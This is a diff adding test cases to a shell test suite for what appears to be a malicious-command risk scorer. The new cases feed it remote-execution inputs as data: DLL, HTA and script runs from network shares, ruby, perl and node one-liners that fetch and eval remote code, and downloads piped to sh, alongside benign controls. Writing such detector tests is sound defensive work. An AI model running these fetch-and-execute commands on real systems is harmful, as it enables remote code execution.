@@ -23402,6 +23402,33 @@ jcheck "text: see-attached-report clean" 'd["score"] == 0 and d["reasons"] == []
 jcheck "text: new-device clean" 'd["score"] == 0 and d["reasons"] == []' text 'a brand new device arrived'
 jcheck "text: kindly-note clean" 'd["score"] == 0 and d["reasons"] == []' text 'kindly note the meeting time'
 
+# ── cycle-515: UNC direct-execution + interp builtin-fetch + fetch-CLI parity ─
+jcheck "unc: rundll32 share dll == 65" 'd["score"] == 65' paste 'rundll32 \\e\s\x.dll,Entry'
+jcheck "unc: regsvr32 share dll == 65" 'd["score"] == 65' paste 'regsvr32 \\e\s\x.dll'
+jcheck "unc: mshta share hta == 65" 'd["score"] == 65' paste 'mshta \\e\s\x.hta'
+jcheck "unc: cmd /c share cmd == 65" 'd["score"] == 65' paste 'cmd /c \\e\s\x.cmd'
+jcheck "unc: powershell -file share ps1 == 65" 'd["score"] == 65' paste 'powershell -file \\e\s\x.ps1'
+jcheck "unc: pwsh -file share ps1 == 65" 'd["score"] == 65' paste 'pwsh -file \\e\s\x.ps1'
+jcheck "unc: msiexec share msi == 45" 'd["score"] == 45' paste 'msiexec /q /i \\e\s\x.msi'
+jcheck "unc: java -jar share jar == 45" 'd["score"] == 45' paste 'java -jar \\e\s\x.jar'
+jcheck "unc: installutil share exe == 45" 'd["score"] == 45' paste 'installutil \\e\s\x.exe'
+jcheck "interp: ruby open-uri eval == 65" 'd["score"] >= 65' paste 'ruby -ropen-uri -e "eval(open(\"http://e/x\").read)"'
+jcheck "interp: perl lwp eval == 65" 'd["score"] >= 65' paste 'perl -MLWP::Simple -e "eval(get(\"http://e/x\"))"'
+jcheck "interp: node http.get eval == 65+" 'd["score"] >= 65' paste 'node -e "require(\"http\").get(\"http://e/x\",r=>r.on(\"data\",eval))"'
+jcheck "dl: wget2 pipe == 40" 'd["score"] == 40' paste 'wget2 http://e/x | sh'
+jcheck "dl: lwp-request pipe == 40" 'd["score"] == 40' paste 'lwp-request http://e/x | sh'
+jcheck "dl: httpie pipe == 40" 'd["score"] == 40' paste 'http http://e/x | sh'
+jcheck "dl: xh pipe == 40" 'd["score"] == 40' paste 'xh http://e/x | sh'
+jcheck "dl: scp pipe == 40" 'd["score"] == 40' paste 'scp u@e:/x f | sh'
+jcheck "unc: powershell -File local benign" 'd["score"] == 0' paste 'powershell -File C:\x\y.ps1'
+jcheck "unc: cmd single-backslash benign" 'd["score"] == 0' paste 'cmd /c \windows\system32\x'
+jcheck "unc: -file local + share arg benign" 'd["score"] == 0' paste 'powershell -file x.ps1 \\srv\logs\out'
+jcheck "unc: msiexec TARGETDIR share benign" 'd["score"] == 0' paste 'msiexec /i x.msi TARGETDIR=\\srv\s'
+jcheck "interp: node server benign" 'd["score"] == 0' paste 'node server.js http://x'
+jcheck "interp: ruby app benign" 'd["score"] == 0' paste 'ruby app.rb http://x'
+jcheck "dl: scp alone benign" 'd["score"] == 0' paste 'scp f u@e:/x'
+jcheck "dl: ftp alone benign" 'd["score"] == 0' paste 'ftp ftp.gnu.org'
+
 # ─── results ────────────────────────────────────────────────────────────
 
 echo ""
